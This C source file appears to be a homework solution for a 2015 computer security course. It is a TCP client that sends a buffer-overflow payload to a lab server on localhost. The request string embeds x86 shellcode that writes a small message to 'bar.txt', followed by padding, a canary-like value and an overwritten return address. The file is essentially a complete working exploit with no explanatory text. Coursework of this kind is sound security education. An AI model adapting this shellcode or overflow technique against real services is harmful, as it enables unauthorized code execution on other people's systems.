/* file: clien2.c class: 18-732, Spring 2015 assignment: Homework 1
*/

/* Obligatory includes */


#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <sys/time.h>
#include <errno.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/uio.h>
#include <stdarg.h>
#include <errno.h>



int main(int argc, char** argv)
{
/*	char reqstring[1000] =
		"1|The cure for boredom is curiosity."
		" There is no cure for curiosity."
		" --Dorothy Parker";
*/	
	char reqstring[1000] = "1|\xeb\x2b\x31\xd2\x31\xc9\x31\xc0\x66\xba\x24\x01\xb1\x42\x5b\x83\x6b\x07\x01\x83\x43\x08\x01\xb0\x05\xcd\x80\x31\xd2\x31\xc9\xb2\x06\x80\xc3\x08\x89\xd9\x89\xc3\xb0\x04\xcd\x80\xc3\xe8\xd0\xff\xff\xff\x62\x61\x72\x2e\x74\x78\x74\x01\x48\x20\x77\x69\x6e\x21";
	int injectlen = 0;
	while(injectlen<=377){
		if(reqstring[injectlen] == 0){
			reqstring[injectlen]='I';		
		}	
		injectlen++;
	}
	strcpy(&reqstring[378],"\xfe\xca\xde\xde");
	injectlen = 382;
	while(injectlen<=397){
		if(reqstring[injectlen] == 0){
			reqstring[injectlen]='I';		
		}	
		injectlen++;
	}
	strcpy(&reqstring[398],"\x98\x6b\x48\x55");

	int PORTNUM;
	char SERVER_IP[16];
    
	int sock, nbytes, i, total, s;
	char request[1000];
	char recvline[1000];
	struct sockaddr_in srv;
 
	/* Set up some defaults for if you don't enter any parameters */ 
	PORTNUM = 18732;
	strcpy(SERVER_IP, "127.0.0.1");	

	printf("\nUsage: client [-port <port_number>] [-server <server_IP>]\n");
        
	/* Process command line switches */
	/* Usage: client [-port <port_number>] [-server <server_IP>] */
	for(i = 1; i < argc; i++){
		if(argv[i][0] == '-'){
			if(strcmp(argv[i], "-port") == 0){
				PORTNUM = atoi(argv[++i]);
			}else if(strcmp(argv[i], "-server") == 0){
				strncpy(SERVER_IP, argv[++i],16);
		 }else{
				printf("Unknown switch \"%s\"\n", argv[i]);
				exit(1);
			}
		}else{
			printf("Unknown switch \"%s\"\n", argv[i]);
			exit(1);
		}
	}

	/* Fill in the server data structure */
	memset(&srv, 0, sizeof(srv));
	srv.sin_family = AF_INET;
	srv.sin_port = htons(PORTNUM);
	srv.sin_addr.s_addr = inet_addr(SERVER_IP);

	/* Create the socket */
	if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0){
		perror("socket");
		exit(1);
	}

	printf("\nConnecting to %s:%u\n", SERVER_IP, PORTNUM);

	/* Connect to the socket */
	if(connect(sock, (struct sockaddr*) &srv, sizeof(srv)) < 0){
		perror("connect");
		exit(1);
	}

	printf("The request is:\n%s\n", reqstring); 

	/* Make the request */
	strncpy(request, reqstring,1000 ); 
	total = 0;
	s = strlen(request);
	while( total < s){
		nbytes = write(sock, request + total, s);
		total = total + nbytes;
	} 

        printf("The response of the server is:\n");	

	/* Get and output the response */
	nbytes = 0;
	while( (nbytes = read(sock, recvline, 1000)) > 0){
		recvline[nbytes] = 0;
		printf("%s\n", recvline); 
	}


	return(0);
}

